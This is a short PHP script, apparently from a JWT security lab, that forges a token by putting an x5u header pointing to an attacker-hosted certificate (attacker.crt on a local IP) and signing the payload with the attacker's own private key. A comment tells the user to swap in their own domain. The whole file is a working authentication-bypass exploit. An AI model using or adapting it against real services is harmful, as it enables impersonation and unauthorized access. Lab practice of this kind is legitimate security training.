<?php

// Configurações básicas
$privateKeyPath = 'chavePrivada.key';
$algorithm = 'RS256';


$header = [
    'alg' => $algorithm,
    'typ' => 'JWT',
    'x5u' => 'http://172.17.0.1:8080/key/attacker.crt', //lembrar de mudar a url para a de um dominio seu 
    'lab' => 'jwt-x5u-header'
];


$payload = [
    "user_id" => 123,
    "username" => "Gabriel",
    "role" => "user",
    'exp' => time() + 3600, 
];
// Codificação do cabeçalho e payload
$headerBase64 = base64_encode(json_encode($header));
$payloadBase64 = base64_encode(json_encode($payload));

// Assinatura
$signature = '';
openssl_sign("$headerBase64.$payloadBase64", $signature, file_get_contents($privateKeyPath), OPENSSL_ALGO_SHA256);

// Codificação da assinatura
$signatureBase64 = base64_encode($signature);

$jwt = "$headerBase64.$payloadBase64.$signatureBase64";


echo "$jwt";
